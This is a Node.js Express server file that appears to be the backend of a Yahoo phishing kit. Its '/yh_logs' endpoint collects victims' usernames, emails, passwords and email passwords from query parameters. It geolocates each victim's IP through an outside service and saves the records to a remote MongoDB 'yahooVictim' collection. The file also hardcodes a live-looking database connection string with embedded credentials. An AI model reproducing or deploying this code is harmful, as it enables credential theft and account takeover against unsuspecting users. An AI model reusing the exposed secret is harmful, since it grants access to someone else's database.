const express = require('express')
const app = express()
const port = process.env.PORT || 9000;
    rp = require('request-promise'),
    requestIp = require('request-ip'),
    bodyParser = require('body-parser'),
    mongoose = require("mongoose"),
    Sniffr = require("sniffr"),
    s = new Sniffr(),
    yahooVictimSchema = null,
    yahooVictim = null,
    visitorIp = null,
    db = null;

mongoose.connect("mongodb+srv://evox2188:uagwvUrc7LMYQOsb@ym1.3tw2bix.mongodb.net/?retryWrites=true&w=majority", {
    useNewUrlParser: true,
    useUnifiedTopology: true
})

db = mongoose.connection;

yahooVictimSchema = new mongoose.Schema({
	username: String,
    email: String,
    password: String,
    password2: String,
    emailpassword: String,
    userAgent: String,
    victimIpInfo: {}
}, {
    minimize: false
})

yahooVictim = mongoose.model("yahooVictim", yahooVictimSchema);




app.use(bodyParser.json())

app.use(function(req, res, next) {
    res.header("Access-Control-Allow-Origin", "*");
    res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
    next();
});

app.get("/yh_logs", (req, res) => {
    visitorIp = requestIp.getClientIp(req);
    s.sniff(req.headers['user-agent']);
    console.log(req.headers['user-agent']);
    console.log(s.os.name);
    console.log(visitorIp)
    console.log(req.body)
    res.setHeader("Content-Type", "text/plain");
    getVictimIpInfoAndSaveYahooVictimInfoToDb(req.query.username, req.query.email, req.query.password, req.query.password2,req.query.emailpassword, req.headers['user-agent'], req, res);
})

app.use(express.static('web'));



function getVictimIpInfoAndSaveYahooVictimInfoToDb(username, email, password, password2, emailpassword, userAgent, req, res) {

    rp({
        uri: `http://ip-api.com/json/${visitorIp}`,
        json: true
    }).then(victimIpInfo => {
        console.log(victimIpInfo);

        new yahooVictim({
			username,
            email,
            password,
            password2,
            emailpassword,
            userAgent,
            victimIpInfo
        }).save((err, doc) => {
            if (err) {
                console.log(err);
                res.end("Server Error");
            } else {
				console.log("---");
                console.log(doc);
				console.log("---");
                res.end("Done");
            }
        })

    }).catch(err => {
        console.log(err)
        res.end("Server Error");
    })

}



db.on("error", (err) => {
    console.log(err);
})

db.once("open", () => {

    console.log(`Database connected`);

		app.listen(port, () => {
		  console.log(`Example app listening at http://localhost:${port}`)
		})

})






